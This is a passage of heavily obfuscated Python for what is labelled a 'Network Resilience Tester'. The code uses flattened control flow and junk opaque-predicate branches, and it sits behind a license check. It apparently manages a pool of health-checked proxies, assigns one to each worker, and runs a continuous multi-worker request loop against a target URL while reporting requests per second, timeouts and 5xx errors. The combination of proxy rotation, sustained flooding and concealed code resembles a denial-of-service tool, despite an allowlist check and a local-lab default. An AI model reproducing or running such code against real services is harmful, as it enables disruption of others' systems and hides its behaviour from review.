                IlllllIlIIlIIIIll = 8820200
                continue
            if IlllllIlIIlIIIIll == 8820200:
                getattr(getattr(getattr(self, 'tester'), 'stop_event'), 'set')()
                IlllllIlIIlIIIIll = 8989186
                continue
            if IlllllIlIIlIIIIll == 5587062:
                IlllllIlIIlIIIIll = 4573893
                continue
            if IlllllIlIIlIIIIll == 8989186:
                for t in getattr(getattr(self, 'workers'), 'values')():
                    getattr(t, 'join')(timeout=1.0)
                break
            if IlllllIlIIlIIIIll == 4723918:
                if 20706 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][30] == 20745:
                    IIIllIlIIlllIlllIIllIlI = 8205204
                    while True:
                        if IIIllIlIIlllIlllIIllIlI == 6224274:
                            IIllllIllIIIlIllll = sum(lIlIlIlIIIllIII) + llIIIlIlIIIllIllIl % 32 - IIlIlllIIIIlllIllIl
                            break
                        if IIIllIlIIlllIlllIIllIlI == 8205204:
                            IIlIlllIIIIlllIllIl = 97873920 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3]
                            IIIllIlIIlllIlllIIllIlI = 4796820
                            continue
                        if IIIllIlIIlllIlllIIllIlI == 1356016:
                            IIIllIlIIlllIlllIIllIlI = 2809725
                            continue
                        if IIIllIlIIlllIlllIIllIlI == 4796820:
                            llIIIlIlIIIllIllIl = (IIlIlllIIIIlllIllIl * 7 ^ 1382894) & 16777215
                            IIIllIlIIlllIlllIIllIlI = 2809725
                            continue
                        if IIIllIlIIlllIlllIIllIlI == 2809725:
                            lIlIlIlIIIllIII = [llIIIlIlIIIllIllIl >> 4 & 255 for lIIIlllllllIII in range(7)]
                            IIIllIlIIlllIlllIIllIlI = 6224274
                            continue
                IlllllIlIIlIIIIll = 8820200
                continue
            if IlllllIlIIlIIIIll == 4573893:
                IlllllIlIIlIIIIll = 5587062
                continue

def main_menu():
    lIIlIIIlllIllI = 4249981
    while True:
        if lIIlIIIlllIllI == 9843724:
            lIIlIIIlllIllI = 9014560
            continue
        if lIIlIIIlllIllI == 3449693:
            lllIlllIIIIlllIIII['max_proxies'] = 5
            lIIlIIIlllIllI = 4758432
            continue
        if lIIlIIIlllIllI == 4872572:
            getattr(llIlIIIIlIIIIl, 'refresh_pool')(force=True)
            lIIlIIIlllIllI = 6644565
            continue
        if lIIlIIIlllIllI == 5805599:
            print(f'\nAllocation:\n    {getattr(lllllIIlIIIllIIIllII['allocation_strategy'], 'upper')()}')
            lIIlIIIlllIllI = 1183187
            continue
        if lIIlIIIlllIllI == 3182508:
            print('\nShutdown:\n    CLEAN')
            lIIlIIIlllIllI = 9014560
            continue
        if lIIlIIIlllIllI == 4758432:
            lllIlllIIIIlllIIII['healthcheck_timeout'] = 2
            lIIlIIIlllIllI = 5797786
            continue
        if lIIlIIIlllIllI == 7031381:
            print(f'\nWorkers:\n    {getattr(lllllIIlIIIllIIIllII, 'get')('worker_count', 70)}')
            lIIlIIIlllIllI = 4382621
            continue
        if lIIlIIIlllIllI == 3715157:
            lIllIIlIlIIlllllII = lllIIIIlIllIIlI(llIlIIIIlIIIIl, lllllIIlIIIllIIIllII['allocation_strategy'])
            lIIlIIIlllIllI = 5805599
            continue
        if lIIlIIIlllIllI == 7552822:
            print('===================================')
            lIIlIIIlllIllI = 5904437
            continue
        if lIIlIIIlllIllI == 2769745:
            valid, reason = getattr(IIIIlIIlIIlIlIl, 'validate_target')(IlllIIIIlllllII, IIllIIlIlIIllIIlIlIllI['allowed_hosts'])
            lIIlIIIlllIllI = 3365219
            continue
        if lIIlIIIlllIllI == 9014560:
            print('===================================')
            break
        if lIIlIIIlllIllI == 5797786:
            llIlIIIIlIIIIl = IlIIlllIllIIlllIIlll(llllIIIllllllIllIlIIlIII, lllIlllIIIIlllIIII)
            lIIlIIIlllIllI = 4872572
            continue
        if lIIlIIIlllIllI == 9136203:
            print(f'\nProxy candidates:\n    {len(candidates)}')
            lIIlIIIlllIllI = 6050257
            continue
        if lIIlIIIlllIllI == 5895270:
            candidates = getattr(llllIIIllllllIllIlIIlIII, 'get_all_candidates')()
            lIIlIIIlllIllI = 9136203
            continue
        if lIIlIIIlllIllI == 6050257:
            lllIlllIIIIlllIIII = getattr(IllIIIllIIIIlIIIIIlIIII, 'copy')()
            lIIlIIIlllIllI = 3449693
            continue
        if lIIlIIIlllIllI == 3365219:
            print(f'\nTarget:\n    {(IlllIIIIlllllII if IlllIIIIlllllII else 'LOCAL-LAB')}')
            lIIlIIIlllIllI = 7031381
            continue
        if lIIlIIIlllIllI == 6644565:
            healthy = getattr(llIlIIIIlIIIIl, 'get_healthy_proxies')()
            lIIlIIIlllIllI = 8271841
            continue
        if lIIlIIIlllIllI == 1183187:
            for wid in range(5):
                IlIIIIllIIIIlIIlI = 4616305
                while True:
                    if IlIIIIllIIIIlIIlI == 7698440:
                        llIllIlllIIlIIlIlllIlI = getattr(getattr(llllIIIllllllIllIlIIlIII, 'config'), 'get')('_mask', lambda x: x)(llIIIIllIlIlIIl) if llIIIIllIlIlIIl else 'NONE'
                        IlIIIIllIIIIlIIlI = 8851263
                        continue
                    if IlIIIIllIIIIlIIlI == 2412128:
                        IlIIIIllIIIIlIIlI = 7698440
                        continue
                    if IlIIIIllIIIIlIIlI == 4616305:
                        llIIIIllIlIlIIl = getattr(lIllIIlIlIIlllllII, 'get_proxy_for_worker')(wid)
                        IlIIIIllIIIIlIIlI = 7698440
                        continue
                    if IlIIIIllIIIIlIIlI == 5373915:
                        IlIIIIllIIIIlIIlI = 7698440
                        continue
                    if IlIIIIllIIIIlIIlI == 8851263:
                        if llIIIIllIlIlIIl and '@' in llIIIIllIlIlIIl:
                            lIlIIllllIlIIllIIl = 7914010
                            while True:
                                if lIlIIllllIlIIllIIl == 2620056:
                                    IIllIIllIllIllIIIIlllI, host = getattr(llIIIllIllIIIIIllIIIl, 'split')('@', 1)
                                    lIlIIllllIlIIllIIl = 7984281
                                    continue
                                if lIlIIllllIlIIllIIl == 7984281:
                                    llIllIlllIIlIIlIlllIlI = f'{lIllllIIllIlIllIIlI}://***:***@{host}'
                                    break
                                if lIlIIllllIlIIllIIl == 7914010:
                                    lIllllIIllIlIllIIlI, llIIIllIllIIIIIllIIIl = getattr(llIIIIllIlIlIIl, 'split')('://', 1)
                                    lIlIIllllIlIIllIIl = 2620056
                                    continue
                                if lIlIIllllIlIIllIIl == 3003647:
                                    lIlIIllllIlIIllIIl = 7984281
                                    continue
                        else:
                            llIllIlllIIlIIlIlllIlI = llIIIIllIlIlIIl or 'NONE'
                        IlIIIIllIIIIlIIlI = 6116207
                        continue
                    if IlIIIIllIIIIlIIlI == 6116207:
                        print(f'Worker {wid:<2} -> Proxy: {llIllIlllIIlIIlIlllIlI}')
                        break
            lIIlIIIlllIllI = 7667728
            continue
        if lIIlIIIlllIllI == 5904437:
            IlllIIIIlllllII = getattr(IIllIIlIlIIllIIlIlIllI, 'get')('base_url') or 'http://127.0.0.1:8080'
            lIIlIIIlllIllI = 2769745
            continue
        if lIIlIIIlllIllI == 8271841:
            print(f'\nHealthy proxies:\n    {len(healthy)}')
            lIIlIIIlllIllI = 3715157
            continue
        if lIIlIIIlllIllI == 9970319:
            print(' NETWORK RESILIENCE DIAGNOSTIC ')
            lIIlIIIlllIllI = 7552822
            continue
        if lIIlIIIlllIllI == 4249981:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] * 35 + 69 == 5015:
                IIIlllIIllllIllllIIlII = 2331629
                while True:
                    if IIIlllIIllllIllllIIlII == 4021460:
                        lIIlIIIllIIlllIlIIl = (IIIIIlIllIIIlIlIlllll * 2 ^ 4310923) & 4294967295
                        IIIlllIIllllIllllIIlII = 8134772
                        continue
                    if IIIlllIIllllIllllIIlII == 1311877:
                        llIllIlIIIllIlIIIllllI = sum(IIIllIIllIllllIIlIlllIl) + lIIlIIIllIIlllIlIIl % 26 - IIIIIlIllIIIlIlIlllll
                        break
                    if IIIlllIIllllIllllIIlII == 8135338:
                        IIIlllIIllllIllllIIlII = 1311877
                        continue
                    if IIIlllIIllllIllllIIlII == 2331629:
                        IIIIIlIllIIIlIlIlllll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][29] * 338301 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][24]
                        IIIlllIIllllIllllIIlII = 4021460
                        continue
                    if IIIlllIIllllIllllIIlII == 8134772:
                        IIIllIIllIllllIIlIlllIl = [lIIlIIIllIIlllIlIIl >> 11 & 255 for lllIllIllIIIIIIll in range(2)]
                        IIIlllIIllllIllllIIlII = 1311877
                        continue
            lIIlIIIlllIllI = 1381067
            continue
        if lIIlIIIlllIllI == 1754412:
            lIIlIIIlllIllI = 9843724
            continue
        if lIIlIIIlllIllI == 4382621:
            llllIIIllllllIllIlIIlIII = IlllIIlIlIIllll(IllIIIllIIIIlIIIIIlIIII)
            lIIlIIIlllIllI = 5895270
            continue
        if lIIlIIIlllIllI == 7667728:
            print('\nHealth:\n    PASS')
            lIIlIIIlllIllI = 3182508
            continue
        if lIIlIIIlllIllI == 1381067:
            print('===================================')
            lIIlIIIlllIllI = 9970319
            continue

def main():
    IlIlIlIIIlllll = 9135521
    while True:
        if IlIlIlIIIlllll == 7099981:
            IlIlIlIIIlllll = 4469611
            continue
        if IlIlIlIIIlllll == 9135521:
            if 3108 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][25] == 3224:
                IIlIIIIIIIlIlllIlIlll = 7642924
                while True:
                    if IIlIIIIIIIlIlllIlIlll == 8399611:
                        IIlIIIIIIIlIlllIlIlll = 8399611
                        continue
                    if IIlIIIIIIIlIlllIlIlll == 9861138:
                        lIlIlIllIlllIIlllIIlllI = sum(IIlIIlIllIIIIIIl) + IIIllllllIIIIIIIl % 54 - IlIlIIIIllIlIlI
                        break
                    if IIlIIIIIIIlIlllIlIlll == 7642924:
                        IlIlIIIIllIlIlI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][6] * 348278 + 192
                        IIlIIIIIIIlIlllIlIlll = 9154814
                        continue
                    if IIlIIIIIIIlIlllIlIlll == 5392736:
                        IIlIIlIllIIIIIIl = [IIIllllllIIIIIIIl >> 9 & 255 for IlllllIllllllIlIIIIlI in range(5)]
                        IIlIIIIIIIlIlllIlIlll = 9861138
                        continue
                    if IIlIIIIIIIlIlllIlIlll == 9154814:
                        IIIllllllIIIIIIIl = (IlIlIIIIllIlIlI * 5 ^ 8062264) & 4294967295
                        IIlIIIIIIIlIlllIlIlll = 5392736
                        continue
            IlIlIlIIIlllll = 6694131
            continue
        if IlIlIlIIIlllll == 4967608:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')} NETWORK RESILIENCE TESTER {getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IlIlIlIIIlllll = 7788361
            continue
        if IlIlIlIIIlllll == 7788361:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            IlIlIlIIIlllll = 2433006
            continue
        if IlIlIlIIIlllll == 4469611:
            get_runtime_config()
            IlIlIlIIIlllll = 7079124
            continue
        if IlIlIlIIIlllll == 7079124:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IlIlIlIIIlllll = 4967608
            continue
        if IlIlIlIIIlllll == 6694131:
            load_license()
            IlIlIlIIIlllll = 4469611
            continue
        if IlIlIlIIIlllll == 1548181:
            lIllIIIIllIllIIIIlIl = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Choice [0-3]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
            IlIlIlIIIlllll = 5971215
            continue
        if IlIlIlIIIlllll == 1339854:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  [3] Run Test Mode (Capped 2 Workers, 60s)')
            IlIlIlIIIlllll = 3983996
            continue
        if IlIlIlIIIlllll == 9566837:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            IlIlIlIIIlllll = 1548181
            continue
        if IlIlIlIIIlllll == 5971215:
            if lIllIIIIllIllIIIIlIl == '1':
                main_menu()
                input('\nPress Enter to continue...')
            elif lIllIIIIllIllIIIIlIl in ('2', '3'):
                lllllIIllIlllIII = 1077698
                while True:
                    if lllllIIllIlllIII == 8003202:
                        input('\nPress Enter to continue...')
                        break
                    if lllllIIllIlllIII == 4381871:
                        lllllIIllIlllIII = 4381871
                        continue
                    if lllllIIllIlllIII == 8784270:
                        print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Starting resilience workers ({IlIllIIIlIlIIlIlIIII['worker_count']} workers)... Press Ctrl+C to stop.{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        lllllIIllIlllIII = 1869985
                        continue
                    if lllllIIllIlllIII == 9888653:
                        lllllIIllIlllIII = 4381871
                        continue
                    if lllllIIllIlllIII == 1077698:
                        llllllllIIllIllIIl = lIllIIIIllIllIIIIlIl == '3'
                        lllllIIllIlllIII = 6133853
                        continue
                    if lllllIIllIlllIII == 1869985:
                        getattr(llIIIlIIllIlIIlllll, 'start')()
                        lllllIIllIlllIII = 2262851
                        continue
                    if lllllIIllIlllIII == 6133853:
                        lIlllIlIIlIIlll = getattr(IIllIIlIlIIllIIlIlIllI, 'get')('base_url')
                        lllllIIllIlllIII = 6113514
                        continue
                    if lllllIIllIlllIII == 1678930:
                        getattr(llIIIlIIllIlIIlllll, 'stop')()
                        lllllIIllIlllIII = 7158536
                        continue
                    if lllllIIllIlllIII == 1634956:
                        IlIllIIIlIlIIlIlIIII = getattr(lllllIIlIIIllIIIllII, 'copy')()
                        lllllIIllIlllIII = 9616878
                        continue
                    if lllllIIllIlllIII == 5938004:
                        try:
                            while True:
                                getattr(IlllllIIllIIllIIll, 'sleep')(3)
                                m = getattr(getattr(IllIIlIllllllI, 'metrics'), 'get_metrics')(healthy_count=len(getattr(getattr(IllIIlIllllllI, 'pool'), 'get_healthy_proxies')()), unhealthy_count=len(getattr(getattr(IllIIlIllllllI, 'pool'), 'pool')) - len(getattr(getattr(IllIIlIllllllI, 'pool'), 'get_healthy_proxies')()))
                                print(f'[METRICS] RPS: {m['requests_per_second']} | Req: {m['requests']} | Success: {m['success']} | Timeouts: {m['timeouts']} | ProxyErr: {m['proxy_errors']} | 5xx: {m['http_5xx']} | Healthy Proxies: {m['healthy_proxies']}')
                                if llllllllIIllIllIIl and getattr(IlllllIIllIIllIIll, 'time')() - llIIIIIlIlIIIlIIIlllll >= IlIllIIIlIlIIlIlIIII['max_duration_seconds']:
                                    print('\n[TEST MODE] Duration reached 60 seconds limit. Stopping test...')
                                    break
                        except KeyboardInterrupt:
                            print('\nShutting down workers cleanly...')
                        lllllIIllIlllIII = 1678930
                        continue
                    if lllllIIllIlllIII == 8443998:
                        valid, reason = getattr(IIIIlIIlIIlIlIl, 'validate_target')(lIlllIlIIlIIlll, IIllIIlIlIIllIIlIlIllI['allowed_hosts'])
                        lllllIIllIlllIII = 9167504
                        continue
                    if lllllIIllIlllIII == 6113514:
                        if not lIlllIlIIlIIlll:
                            lIlllIlIIlIIlll = getattr(input('Enter target lab URL (e.g. http://127.0.0.1:8080): '), 'strip')()
                        lllllIIllIlllIII = 8443998
                        continue
                    if lllllIIllIlllIII == 9616878:
                        if llllllllIIllIllIIl:
                            IlIllIIIlIlIIlIlIIII['worker_count'] = 2
                            IlIllIIIlIlIIlIlIIII['test_mode'] = True
                        lllllIIllIlllIII = 1248075
                        continue
                    if lllllIIllIlllIII == 9167504:
                        if not valid:
                            lIlllIIllIIIllllll = 7912895
                            while True:
                                if lIlllIIllIIIllllll == 4275348:
                                    lIlllIIllIIIllllll = 2773845
                                    continue
                                if lIlllIIllIIIllllll == 7912895:
                                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}Target rejected by allowlist: {reason}{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                                    lIlllIIllIIIllllll = 2773845
                                    continue
                                if lIlllIIllIIIllllll == 2773845:
                                    input('\nPress Enter to continue...')
                                    lIlllIIllIIIllllll = 3204217
                                    continue
                                if lIlllIIllIIIllllll == 3204217:
                                    return
                                    break
                        lllllIIllIlllIII = 1634956
                        continue
                    if lllllIIllIlllIII == 7158536:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Test completed cleanly.{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        lllllIIllIlllIII = 8003202
                        continue
                    if lllllIIllIlllIII == 5486686:
                        llIIIlIIllIlIIlllll = IIIlIIlIllIlllIIIIlIlI(IllIIlIllllllI, worker_count=IlIllIIIlIlIIlIlIIII['worker_count'])
                        lllllIIllIlllIII = 8784270
                        continue
                    if lllllIIllIlllIII == 1248075:
                        IllIIlIllllllI = lIIIIlIllIIllIIIIIll(lIlllIlIIlIIlll, IlIllIIIlIlIIlIlIIII)
                        lllllIIllIlllIII = 5486686
                        continue
                    if lllllIIllIlllIII == 2262851:
                        llIIIIIlIlIIIlIIIlllll = getattr(IlllllIIllIIllIIll, 'time')()
                        lllllIIllIlllIII = 5938004
                        continue
            break
        if IlIlIlIIIlllll == 8068631:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  [2] Run Continuous Worker Loop (Production Test)')
            IlIlIlIIIlllll = 1339854
            continue
        if IlIlIlIIIlllll == 3983996:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  [0] Back to Main Menu')
            IlIlIlIIIlllll = 9566837
            continue
        if IlIlIlIIIlllll == 2433006:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  [1] Run Diagnostic Mode')
            IlIlIlIIIlllll = 8068631
            continue
if __name__ == '__main__':
    if '--network-test' in getattr(lIIIlIIlIIlllIIIlIII, 'argv'):
        main_menu()
        getattr(lIIIlIIlIIlllIIIlIII, 'exit')(0)
    try:
        if not IIlIIlIlllIlllllIll():
            print(f'{IIlllIlIlllllIlllllllll} Gagal install requirements{llIIllllllIlllIlIIll}')
            getattr(lIIIlIIlIIlllIIIlIII, 'exit')(1)
        if not initialize_ip_pool():
            print(f'{IIlllIlIlllllIlllllllll}Lisensi gagal, program berhenti.{llIIllllllIlllIlIIll}')
            getattr(lIIIlIIlIIlllIIIlIII, 'exit')(1)
        get_system_info()
        show_proxy_menu()
    except KeyboardInterrupt:
        IlIIlIlIlIIIIllIllIIll()
    except Exception as e:
        print(f'\n{IIlllIlIlllllIlllllllll} Error: {e}{llIIllllllIlllIlIIll}')
        getattr(lIIIlIIlIIlllIIIlIII, 'exit')(1)
